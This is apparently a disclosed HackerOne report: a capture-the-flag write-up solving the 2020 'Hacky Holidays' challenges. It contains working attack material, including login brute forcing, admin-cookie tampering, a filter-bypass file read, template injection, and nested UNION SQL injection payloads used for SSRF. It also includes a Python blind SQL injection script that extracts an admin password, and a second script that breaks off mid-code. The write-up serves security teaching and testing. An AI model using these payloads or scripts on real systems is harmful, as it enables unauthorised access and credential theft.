# A Visit from The Grinch ~ 'Twas the night before Hackmas...

## Report Details
- **Report ID**: 1067912
- **URL**: https://hackerone.com/reports/1067912
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-29T04:00:29.483Z
- **Disclosed**: 2021-01-11T22:09:30.705Z

## Reporter
- **Username**: bendtheory
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
##Foreword
This was an amazing CTF! The first from Hackerone that I've finished and one that I have enjoyed the most. Huge shout out to @adamtlangley for creating this downright poetic challenge. My whopping 20+ invitations are already being put to good use. Hacky Holidays and Merry Hackmas!

##Flag #1 - robots.txt

>'Twas the night before Hackmas, when all through the net
>Not a feature was deployed, not even password reset
>The flag was placed in robots.txt with care
>In hopes that hackers might first look there

A classic! The first flag was nestled in robots.txt, the first place any good hacker or CTFer might look for clues. 

{F1132033}

##Flag #2 - s3cr3t-ar3a
>The flag was nestled all snug in jQuery
>While hackers attempted all of their theories
>I put on my hoodie, my knuckles I cracked
>"I bet I could just right click inspect that"

Going off of Flag 1, the second flag had to be hidden in `/s3cr3t-ar3a`. The source of the page didn't reveal anything interesting. The only thing on the page that looked remotely interesting was the jQuery file hosted locally. 

`<script src="/assets/js/jquery.min.js"></script>`

The version of jQuery used was `jQuery v3.5.1` so I decided to run it through a diff checker online to see if any custom code had been added. 

{F1132043}

Aha! There's a difference! the code clearly looks like it's being used to add a flag to an attribute of an element called `alertbox` which is likely on the `/s3cr3t-ar3a` page. 

```javascript
h1_0 = 'la', h1_1 = '}', h1_2 = '', h1_3 = 'f', h1_4 = 'g', h1_5 = '{b7ebcb75', h1_6 = '8454-', h1_7 = 'cfb9574459f7', h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```
Rather than reverse engineer this obfuscated code, we can just inspect the `alertbox` element! Gotta love a flag hidden in plain sight. 

{F1132048}

##Flag #3 - People Rater

>Then out in the /apps, there arose a new feature
>a people rater? Man, what could be neater?
>Away to Burp Suite, I flew like a flash
>Tore open the base64, and found Grinch's stash

The Grinch rears his ugly head and tells us how he really feels about the Whos down in Whoville! (spoiler: *not great*)

When a name is clicked, the site retrieves the associated rating with a base64 string:

https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6M30=

That `id` decoded is: `{"id":3}`

Looking for something interesting, I decided to try changing the `id` value to 1, re-encoding, and sending it back to the server - revealing the flag!

The Grinch's heart may be capable of growth but his ego will never shrink. 

{F1132060}

##Flag #4 - Swag Shop

>The endpoints on the API of the shop full of swag
>Gave an idea I might not have otherwise had,
>When what to my wondering eyes did appear,
>But the Grinch's PII and address right here!

Clicking around the swag shop didn't bring up any obvious leads. However, there was an API directory with a few endpoints (`stock` `purchase` and `login`) which made me think there may be a few more. 

I fired up a directory brute  force using dirsearch.py and quickly identified two interesting API endpoints `sessions` and `user`

{F1132081}

The `sessions` endpoint was leaking some juicy data:

```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

Session #2 appeared different and piqued my interested. Here it is base64 decoded:

```json
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```
We now have a user ID of sorts (is this Adam's old Windows XP key?) and a cookie. I attempted a few session hijacking attacks using the user and cookie values to no avail. I then took another look at the `user` endpoint. 

```json
{"error":"Missing required fields"}
```

I wasn't sure what those required fields would be, so I started a Param Miner attack in burp to guess query parameters that might be used. The parameter `uuid` popped up and returned a slightly different error message:

```json
{"error":"Could not find matching uuid"}
```

The value of "user" we found on the `sessions` endpoint looked a lot like a UUID... let's try passing it in here!

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

```json
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```
Looks like we doxxed the Grinch 😎

##Flag #5 - Secure Login

>With a little old login and nothing to click,
>I knew in a moment we must brute force it.
>More rapid than eagles my Intruder's words came
>As I analyzed responses to deduce the username

This challenge looked pretty bare bones. Nothing interesting on the page, nothing found in a directory brute force. However, the error message received after a failed login suggested we could enumerate usernames! Instead of a generic error, the page tells us that our specific username is invalid. 'grinch' and 'admin' didn't work so it looked like brute forcing was the only option. 

I started an intruder attack with a list of common names as payloads and extracted the error messages to see which user had a valid login. The username `access` popped up quickly - which avoided the need to continue sending off an additional 10k requests!

{F1132083}
{F1132084}

Using a "top 100" password list, I set up the same attack to brute force the password and log in:

{F1132087}

So now I could log in with the credentials `access`/`computer` ... but there were no files to download :( However! The base64 session token after logging in appeared to contain a JSON object:

```json
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

Life's better as an admin, so I flipped `false` to `true`, re-encoded, and changed the value of the `securelogin` cookie. After refreshing the page a zip file containing "secure" files showed up. 

{F1132092}

Given the brute-forcey nature of this challenge so far, it was time to guess the password! Kali Linux is preloaded with John the Ripper, a hash cracking tool. JTR is also bundled with a handy binary called `zip2john` which takes a password protected zip file and extracts the hash in a format usable by John the Ripper. 

All that was left was to crack the hash with `john hash.txt` which revealed the password was  `hahahaha`

Using the password to unzip the file gave the flag and `xxx.png`.... which is  a *lewd nude of a green dude*

{F1132093}

##Flag #6 - My Diary
> No root! No admin! Only ere privileged hackers
> Exploiting code from developer slackers.
> Embed the payload to make off with a haul!
> Now `str_replace`! `str_replace`! `str_replace` all!

Judging by the URL: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

...this immediately looked like an LFI challenge.  I quickly found that `entries.html` existed here: https://hackyholidays.h1ctf.com/my-diary/entries.html

I ran a quick fuzz using dirsearch and found that `index.php` existed in the same directory:

https://hackyholidays.h1ctf.com/my-diary/index.php

I then accessed index.php as a template - https://hackyholidays.h1ctf.com/my-diary/?template=index.php - which revealed the following source code:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

We can see the fake admin page and the "secretadmin" pages here and the protections in place to avoid access to them. 

Trying to access `admin.php` returns a 404, as expected since the page has moved. 

Trying to access `secretadmin.php` states "You cannot view this page from your IP Address"

Looking deeper into the code, the `str_replace` function reminds me of a few XSS filters I've defeated in the past with the classic `<scr<script>ipt>`

Because the value of template is only looking for the values "admin.php" and "secretadmin.php" anywhere in the string and replacing them with empty text, a payload can be crafted to defeat the protection

`secretadsecretadmiadmin.phpn.phpmin.php`

On pass one, the new value of page is `secretadsecretadmin.phpmin.php` with `admin.php` removed

One pass two, the final value of page is `secretadmin.php` with `secretadmin.php` removed. This allows us to dump the contents of secretadmin.php and retrieve the flag:

{F1132099}

Uh oh... the Grinch is  planning to DDoS Santa's Workshop?? I knew this guy was trouble but THIS??? Thankfully we've intercepted this intel in time to save Christmas!

##Flag #7 - Hate Mail Generator

> Whether Bob or Alice, the Grinch hates them both
> "Stinking, rotten, abominable!" he quoth
> Seething with ire, the Grinch routes his mail
> while hackers inject templates to prevail!

The Grinch loves sending the worst mail huh? (*Jury duty, jury duty, jury duty, blackmail, pink slip, chain letter, eviction notice*). Much like the Grinch loves injecting hate mail into our inboxes, we too must inject templates to... save Christmas!

The one sample piece of hate mail we have to work with shows us the format and the syntax `{{template:file.html}}`:

{F1132768}

It looks like files can be included as templates. In order to find the file location, I ran dirsearch.py to find hidden directories. This revealed the `templates` folder and an admin template file! Let's come back to that later, since direct navigation returns a 403 Forbidden error. 

{F1132758}

When writing a new campaign you can either "Create" or "Preview" it. 

{F1132769}

We can't create a campaign because we're "out of credits" but we *can* submit a preview. Here's what that request looks like:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

The preview syntax appears to be slightly different from the sample campaign. Let's try a few things and see if we can access `38dhs_admins_only_header.html`

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

Response: `You do not have access to the file 38dhs_admins_only_header.html` dangit!

Taking another look at the `preview_data` parameter tells us that `Alice` replaces `{{name}}`. Let's try the same injection but abstracted by a step:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

Response: 
{F1132770}

Looks like there's a new ~~sheriff~~ *Grinch Network Admin* in town. 

##Flag #8 - Forum

> He was covered in green fur, from his head to his foot
> Hood up and hacking, Santa's DDoS was afoot!
> The Grinch's secret post laid bare the attack
> We've got to keep cracking and get him right back!

This flag was tricky! An inital brute force of the forum app revealed the phpmyadmin login endpoint

{F1132840}

No amount of fuzzing, bruteforcing, or otherwise hammering the app seemed to yield any results. That's when I decided to check twitter to see if I could get some direction. 

https://twitter.com/JoeMilian1/status/1340297608699457536

Looks like the creator of this devious challenge was Adam! I quickly found a personal site, and a github account. I checked his latest commit which was on the following repo:

https://github.com/Grinch-Networks/forum

{F1132858}

Now we're getting somewhere! All the code related to this forum appeared fairly locked down. I didn't find anything that jumped out at as usable on my first pass. I later noticed that 4 commits had been made to this repo and decided to dig deeper into those to look for secrets. 

https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

{F1132859}

In a commit called "Small fix" we can see that Adam removed a database connection credential which we can view in plain text! Trying this cred on the `phpmyadmin` endpoint gets us to the next step.

{F1132861}

`grinch` appears to be the admin user, so lets try cracking his password! A quick check on crackstation.net reveals that the password is `BahHumbug`. Now we can login to the form as grinch and read his secret plans!

{F1132870}
{F1132871}

Uh oh, the Grinch is getting closer to launch his attack! We can't stop now! and I'm starting to think this "Adam" guy might be working with him...

##Flag #9 - Evil Quiz

> His eyes lurid yellow, like a black cat at night
> His smile a gnarled root, a downright good fright!
> His mind filled with evil, tricks, and malaise
> Made this SQLi challenge go on for days

The difficulty really began to ramp up with this challenge. I first thought there was going to be a blind XSS element with the name being reflected after the quiz. But I started to notice that different names had different number of players who also used the same name. Using "grinch" as a name told me 

`There is 14 other player(s) with the same name as you!`

I started to imagine what SQL query might retrieve that information:

```sql
SELECT count(*) FROM sessions WHERE name = 'grinch';
```

I changed my name to `grinch' AND 1=1;--`, completed the quiz... and got the same response!

{F1133306}

I then changed my name to `grinch' AND 1=2;--`, completed the quiz, and was told that there were 0 other players with my name. Se we now had a blind SQLi attack and a 1 byte difference -- 14 vs 0 -- that we could use for our boolean checks. 

Writing a script for this would be tricky because this is a second order SQL injection: we first have to set the payload, then trigger the payload with a second request. To add insult to injury, the response time on this challenge is *abyssmal*. Nevertheless, I developed a script to perform substring character brute forcing to ascetain the table, columns, and data needed to access the admin section. 

```python
import requests

url1 = 'https://hackyholidays.h1ctf.com/evil-quiz' #POST
url2 = 'https://hackyholidays.h1ctf.com/evil-quiz/score' #GET

#threshold = 1953 # create an dict with thresold values, if we have two values

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^*()-_=+[{]}\|;:,/?"

s = requests.Session()
cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='f0dd61e4a671f34f123e36e0b8f2727c')
s.cookies.set_cookie(cookie_obj)
pos = 1
threshold = 0
out = ''
while True:
	found = 0
	for c in alphabet:
		
		# blind sqli brute force 1: find a table
		# select table_name from information_schema.tables where table_schema=database() limit 1
		# discovered table named 'admin'
		
		# blind sqli brute force 2: find columns in admin table 
		# select column_name from information_schema.columns where table_name='admin'
		# discovered columns id, password, username in table 'admin'
		
		# blind sqli brute force 3: find username in admin table
		# select username from admin where id='1'
		# discovered username 'admin'
		
		# blind sqli brute force 4: find password in admin table
		# select password from admin where username='admin'
		# discovered password 'S3creT_p4ssw0rd-$'
		
		payload = "grinch' AND hex(substring((select password from admin where username='admin'),%s,1))=hex('%s');--" % (str(pos), c)
		
		params = {"name":payload}

		s.post(url1, data=params)
		r2 = s.get(url2) 
		if (threshold == 0):
			# response length will increase with payload length. remove the payload length from the response length to negate this
			#100 + 50
			#100 - 50 = 50
			#101 + 51
			#101 - 51 = 50
			threshold = len(r2.text) - len(payload)
		
		# a true response will return at least one more byte than a false response. break and continue to the next character if we get a hit. 
		if ((len(r2.text) - len(payload)) > threshold):
			out += c
			print out
			found = 1
			break
			
		# TODO: edge case where first letter in alphabet returns true response. This was done manually for finding 'admin' table

	if (found):
		pos += 1
		continue
	else:
		print out
		break
```

This script will select one letter at a time from the password for the username `admin` and perform a a boolean brute force check on each letter. The first character of the password isn't 'a' so the script continues until it gets to 'S'. The response is 1 byte larger meaning our SQL statement was true and the first character of the password is 'S'. That process is repeated until all characters are identified.  

{F1133308}

The final username / password combo was `admin` / `S3creT_p4ssw0rd-$` which gave access to the flag:

{F1133082}

I reran this script and it took almost an hour to complete! It took the better half of a day to finally bruteforce the password the first time around. 

##Flag #10 - Signup Manager
> The zip of source code was easy to see
> but not the PHP trick that lie underneath.
> Surely there has to be some kind of quirk.
> Numeric type confusion just might work!

The flag was a cut and dry case of RTFM. By carefully reading the provided code and the PHP docs, the flag is easy to spot. Regardless, this was one of my favorite challenges because I learned soemthing new about PHP! Thanks..... *grinch*. hmph. 

Before even attempting to sign up, I found an HTML comment in the source directing me to `README.md` which contained the following:

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

I was able to download `signupmanager.zip` at the following URL: https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

Unzipping the file reveals the source code for the site. The file `index.php` appears to have the code that creates an entry in `users.txt` which is referenced when logging in. Based on step 6 in the README, it looks like our objective is to create an entry in user.txt that ends in `Y` which will make the user an admin. 

I had a difficult time imagining what the entries in user.txt would look like so I spun up the php code in a digital ocean droplet to see for myself!

http://159.65.226.16/hacky/

I made users.txt accessible for ease of testing: http://159.65.226.16/hacky/users.txt

{F1133117}

I tried spamming `Y` in the last name and maxing out the values for each aspect of the entry but was unable to extend the length beyond what was intended. Looking at the code again, I went through each validation function to see if any of them could be bypassed in some way. 

```php
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
```
username, firstname, and lastname are capped at 15 chars with the `substr` function. the password is md5 hashed which is always 32 chars. That left `age` which is checked to ensure it is numeric with `is_numeric` and then `intval` is used  to get the final value. 

`is_numeric` seemed ... *flexible* so I looked it up in the PHP docs. 

{F1133118}

The entry `1337e0` stood out because it looked like a scientific notation and is considered numeric by PHP. Our PHP code specifically checks the length to ensure the number is less than 3 characters, but it could be replaced with something like `9e9` which is interprested by PHP as `9 * 10 ^ 9`. This has an integer value of  `9000000000` - waaay longer than 3 characters!

By capturing a signup request and modifying the age value to `9e9` and making the last name `YYYYYYYYYYYYYYY` the length of our age will push a `Y` into the last position of our entry in users.txt, making our new user an admin!

{F1133127}
{F1133128}

Got the flag and access to the Recon Server! It's game time now...

## Flag #11 - Grinch Recon
>He was lean and mean, a right spooky old Who
>And I laughed when I saw a hint of what to do
>A wink of his eye and his evil twisted head 
>Soon gave me to know I had everything to dread;

"*We need to go deeper*" I thought after a double SQLi and an SSRF. "There has to be a *third* SQL injection!"

This challenge was the work of a true menace. Adam is become death, the destroyer of Christmas. 

###Background
This recon server holds picture albums of reconnaissance photos related to Santa and his work shop. Albums are stored in a database and retrieved via a hash. Pictures within albums are retrieved securely using an authenticated server side request, precluding forgery. 

Additionally, the recon server has an API which is not directly accessible. Tying everything together, you have to find way to authenticate arbitrary SSRF requests to the API in order to deduce the username and password in order to move to the next flag. 

### Step 1: SQL Injection #1 - hash
There was a fairly obvious SQL injection on the value of `hash`. I checked this manually with a simple boolean payload: `' AND 1=1;--`


 - 200, album loads: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=1;--
 - 404: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=0;--

I loaded up SQLMap and dumped the database:

`sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump`

```
Database: recon                                                                                                                                                                       
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```
```
Database: recon                                                                                                                                                                       
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```
### Step 2: recon on r3c0n
That was nice and all... but I still couldn't couldn't figure out how I was going to authenticate to the API. Let's dig around and see how this whole thing is set up. 

The `/picture` endpoints loaded in the albums look like this:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9

And the `data` parameter contains the following JSON object:
```json
{
  "image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg",
  "auth": "bbf295d686bd2af346fcd80c5398de9a"
}
```
Any attempts to modify the image URL and auth hash and resend the request resulted in `invalid authentication hash`. It seemed like it had to be generated the hash on the backend. 

There's also an API hosted at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api 

{F1133182}

### Step 3: SQL Injection #2 - state of the union of the union

Around this time, I started to reach out to other CTFers on discord to brainstorm how to do this challenge. A small team formed and @mava contributed an amazing idea: *double SQL injection. *

I started to imagine what the underlying SQL query(s) looked like for the /album endpoint. There were two tables and the ID had to come from the hash in the first table. 

Query #1
```sql
SELECT id FROM album WHERE hash = 'jdh34k '
```
Value from query #1 is sent to query #2
```sql
SELECT photo FROM photo where album_id = '1'
```
Looking at these two queries... it seemed possible that you could `UNION` something to the output of query #1 that would be injected into query #2. 

I was able to craft the following initial SQLi payload that shows you can control the value sent to the second query with a `UNION`


- First album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%22,%22456%22,%22789%22%20--+
- Second album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%222%22,%22456%22,%22789%22%20--+
- Third album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%223%22,%22456%22,%22789%22%20--+

If we can nestle a payload into the first union slot, we should be able to execute a SQLi inside a SQLi. I started with an ORDER BY to determine there were three columns, which makes sense based on the DB dump performed earlier. 

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%27%20ORDER%20BY%203--+%22,%22456%22,%22789%22%20--+
`1' UNION SELECT "1' ORDER BY 3-- ","456","789" -- `


Now we can perform the second `UNION`:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,3%27--+%22,%22456%22,%22789%22--+
`1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"-- `

which produces this URL:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==

which (doesnt return an invalid hash error!! and) decodes to 

```json
{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```

NICE! we can now modify the `3` in our embedded payload to injected a path traversal SSRF payload to start analyzing the API!

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+

Here's the full URL decoded SQL injection payload:

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"-- 
```

### Step 4: SSRF and API analysis

For this part, I got a little inefficient and used Burp's Intruder to fuzz for valid API endpoints. I ran an inital fuzz using a common.txt wordlist to collect base64 data parameters using the "Grep - Extract" intruder option. 

{F1133257}

I then ran a second attack on the `picture` endpoint with the collected base64 values and analyzed the responses to determine which endpoints were valid. 

{F1133267}

I ended up finding two endpoints that triggered an "Invalid content type detected" error: `/api/ping` and `/api/user`. This response indicates that the request was successful and returned a 200 response, but the content type was not an image. I'm confident that ping was a total red herring because I didn't find anything remotely useful with it. 

*Now* is when the API documentation comes in handy.  

{F1133315}

If an invalid parameter is passed to an API endpoint, a 400 response is returned. I ran the exact same attack already outlined above to determine valid parameters on the `user` endpoint. Valid parameters trigger a 204 response. 

The valid parameters for the endpoint are `username` and `password`. The last piece of this puzzle was to figure out valid values for those parameters. 

###Step #5: SQL Injection #3 - We have to go deeper! ... *again*

Looking for interesting errors, I ran the attack outlined in step 3 a third time, but I used a list of ASCII metachars to look for errors or different responses. During that attack, I noticed that a `%` character in the `username` parameter triggered the `Invalid content type` error, meaning a 200 response. 

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+

Thinking about it a little harder, it looks like we have a reflection context inside a SQL `LIKE` query! Here's what I imagine the query to look like:

```
SELECT * FROM user WHERE username LIKE '%' OR password LIKE ''
```
Using this functionality, we can do a substring brute force to discover the username and password values - similar to what we did for Flag #9. 

I used the following script to extract the username and password:

```python
import requests
from lxml import html

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789~`!%@#$^*()-_=+[{]}\|;:,<.>/?"

host = "https://hackyholidays.h1ctf.com"
url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=?hash=-4685%%27%%20UNION%%20SELECT%%20%%22%%27%%20UNION%%20SELECT%%20null,null,%%27../api/user?username=grinchadmin%%26password=%s%%25%%27--+%%22,null,null--+%%22"

#username = grinchadmin
#password = s4nt4sucks
